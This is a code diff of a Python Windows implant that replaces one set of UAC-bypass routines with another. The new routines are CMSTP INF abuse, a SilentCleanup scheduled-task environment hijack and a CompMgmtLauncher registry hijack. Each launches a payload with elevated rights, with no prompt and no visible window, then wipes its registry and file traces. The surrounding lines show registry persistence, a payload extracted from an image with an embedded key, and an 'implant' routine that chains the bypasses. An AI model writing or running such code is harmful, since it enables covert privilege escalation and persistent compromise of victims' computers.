@@ -26,142 +26,177 @@ def is_admin():
     except Exception:
         return False
 
-def uac_bypass_eventvwr(payload_path):
+def uac_bypass_cmstp(payload_path):
     """
-    COMPLETELY SILENT UAC bypass using eventvwr.exe (Event Viewer).
-    No UAC prompt, no windows, no GUI - 100% invisible.
-    Works on Windows 7/8/10/11.
+    TRULY SILENT UAC bypass using CMSTP.exe (Connection Manager).
+    100% invisible - NO windows, NO GUI, NO prompts.
+    Works on Windows 10/11.
+    """
+    try:
+        import winreg
+        import tempfile
+
+        # Create INF file that CMSTP will process
+        inf_template = f'''[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+pythonw.exe "{payload_path}"
+taskkill /IM cmstp.exe /F
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+
+[Strings]
+ServiceName="WindowsUpdate"
+ShortSvcName="WindowsUpdate"'''
+
+        # Write INF to temp
+        inf_path = os.path.join(tempfile.gettempdir(), 'update.inf')
+        with open(inf_path, 'w') as f:
+            f.write(inf_template)
+
+        # Execute CMSTP silently - it auto-elevates and runs our command
+        # /au = All Users, /s = Silent
+        subprocess.Popen(
+            f'C:\\Windows\\System32\\cmstp.exe /au "{inf_path}"',
+            shell=True,
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
+        import time
+        time.sleep(3)
+
+        # Clean up
+        try:
+            os.remove(inf_path)
+        except:
+            pass
+
+        return True
+    except Exception:
+        return False
+
+def uac_bypass_silentcleanup(payload_path):
+    """
+    SILENT UAC bypass using SilentCleanup scheduled task.
+    Abuses existing Windows task that runs elevated.
+    100% invisible.
     """
     try:
         import winreg
 
-        # eventvwr.exe tries to launch mmc.exe by reading this registry path
-        # We hijack it to execute our payload instead
-        reg_path = r'Software\Classes\mscfile\shell\open\command'
+        # SilentCleanup runs %windir%\system32\cleanmgr.exe with elevated privileges
+        # We hijack the environment variable %windir% to point to our payload
 
-        # Create the registry key hierarchy
-        try:
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell\open')
-        except Exception:
-            pass
+        reg_path = r'Environment'
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
 
-        # Set our payload as the command
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
+        # Create a directory structure to mimic Windows path
+        temp_dir = os.path.join(os.getenv('TEMP'), 'win')
+        sys32_dir = os.path.join(temp_dir, 'System32')
+        os.makedirs(sys32_dir, exist_ok=True)
+
+        # Create fake cleanmgr.exe that runs our payload
+        fake_cleanmgr = os.path.join(sys32_dir, 'cleanmgr.exe')
+        bat_content = f'@echo off\npythonw.exe "{payload_path}"\nexit'
+
+        # Write as bat then use cmd to execute
+        bat_path = os.path.join(sys32_dir, 'cleanmgr.bat')
+        with open(bat_path, 'w') as f:
+            f.write(bat_content)
+
+        # Copy cmd.exe as cleanmgr.exe to execute the bat
+        import shutil
+        shutil.copy('C:\\Windows\\System32\\cmd.exe', fake_cleanmgr)
+
+        # Set windir to our temp directory
+        winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, temp_dir)
         winreg.CloseKey(key)
 
-        # Launch eventvwr.exe - it auto-elevates and executes our payload
-        # No Event Viewer window opens because our command executes first
+        # Trigger SilentCleanup task
         subprocess.Popen(
-            'C:\\Windows\\System32\\eventvwr.exe',
+            'schtasks /Run /TN "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" /I',
             shell=True,
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
         )
 
-        # Give it time to execute
+        import time
+        time.sleep(3)
+
+        # Restore windir
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
+        try:
+            winreg.DeleteValue(key, 'windir')
+        except:
+            pass
+        winreg.CloseKey(key)
+
+        # Cleanup temp files
+        try:
+            shutil.rmtree(temp_dir)
+        except:
+            pass
+
+        return True
+    except Exception:
+        return False
+
+def uac_bypass_compmgmtlauncher(payload_path):
+    """
+    SILENT bypass using CompMgmtLauncher.exe.
+    No windows shown.
+    """
+    try:
+        import winreg
+
+        # CompMgmtLauncher reads from mscfile handler
+        reg_path = r'Software\Classes\mscfile\shell\open\command'
+
+        try:
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell\open')
+        except:
+            pass
+
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+        # Use cmd /c to run silently and exit immediately
+        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'cmd.exe /c start /b pythonw.exe "{payload_path}"')
+        winreg.CloseKey(key)
+
+        # CompMgmtLauncher auto-elevates
+        subprocess.Popen(
+            'C:\\Windows\\System32\\CompMgmtLauncher.exe',
+            shell=True,
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
         import time
         time.sleep(2)
 
-        # Clean up registry traces immediately
+        # Cleanup registry
         try:
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell\open')
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell')
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile')
-        except Exception:
-            pass
-
-        return True
-    except Exception:
-        return False
-
-def uac_bypass_sdclt(payload_path):
-    """
-    BACKUP SILENT UAC bypass using sdclt.exe (Windows Backup).
-    Completely invisible, no windows shown.
-    Works on Windows 10+.
-    """
-    try:
-        import winreg
-
-        # sdclt.exe reads from this registry path
-        reg_path = r'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe'
-
-        # Create and set the hijack
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
-        winreg.CloseKey(key)
-
-        # Also need to set IsolatedCommand
-        reg_path2 = r'Software\Classes\exefile\shell\runas\command'
-        try:
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell\runas')
-        except Exception:
-            pass
-
-        key2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path2)
-        winreg.SetValueEx(key2, 'IsolatedCommand', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
-        winreg.CloseKey(key2)
-
-        # Launch sdclt - silent elevation
-        subprocess.Popen(
-            'C:\\Windows\\System32\\sdclt.exe',
-            shell=True,
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
-        )
-
-        import time
-        time.sleep(2)
-
-        # Clean up
-        try:
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path2)
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell\runas')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile')
-        except Exception:
-            pass
-
-        return True
-    except Exception:
-        return False
-
-def uac_bypass_computerdefaults(payload_path):
-    """
-    THIRD BACKUP - ComputerDefaults.exe bypass.
-    Silent execution, no GUI.
-    """
-    try:
-        import winreg
-
-        reg_path = r'Software\Classes\ms-settings\shell\open\command'
-
-        try:
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
-        except Exception:
-            pass
-
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
-        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
-        winreg.CloseKey(key)
-
-        subprocess.Popen(
-            'C:\\Windows\\System32\\ComputerDefaults.exe',
-            shell=True,
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
-        )
-
-        import time
-        time.sleep(2)
-
-        try:
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
-        except Exception:
+        except:
             pass
 
         return True
@@ -268,7 +303,7 @@ def add_registry_persistence_user():
 def extract_payload_to_disk():
     """Extract the encrypted payload from the image and write to disk."""
     try:
-        divine_key = b'EaOymE52dnkN1KB98DENr4lVUQ5V_dXRc1wFloE2C34='
+        divine_key = b'krei0ZlTuJ1IZMyAm5GdBaEBOjfpxYwkVg15lYPUbSg='
 
         if hasattr(sys, 'frozen'):
             base_path = sys._MEIPASS
@@ -370,13 +405,13 @@ def sow_and_awaken_implant():
                     # User-level persistence as fallback
                     add_registry_persistence_user()
 
-                    # Try multiple SILENT UAC bypasses - all completely invisible
-                    # Try eventvwr first (most reliable, no GUI)
-                    if not uac_bypass_eventvwr(PERSISTENT_PATH_USER):
-                        # If eventvwr fails, try sdclt
-                        if not uac_bypass_sdclt(PERSISTENT_PATH_USER):
-                            # Last resort: ComputerDefaults
-                            uac_bypass_computerdefaults(PERSISTENT_PATH_USER)
+                    # Try COMPLETELY SILENT UAC bypasses - truly zero windows
+                    # Try CMSTP first (INF-based, 100% silent)
+                    if not uac_bypass_cmstp(PERSISTENT_PATH_USER):
+                        # If CMSTP fails, try CompMgmtLauncher
+                        if not uac_bypass_compmgmtlauncher(PERSISTENT_PATH_USER):
+                            # Last resort: SilentCleanup task abuse
+                            uac_bypass_silentcleanup(PERSISTENT_PATH_USER)
 
             # Launch user-level payload if not running
             implant_running = False
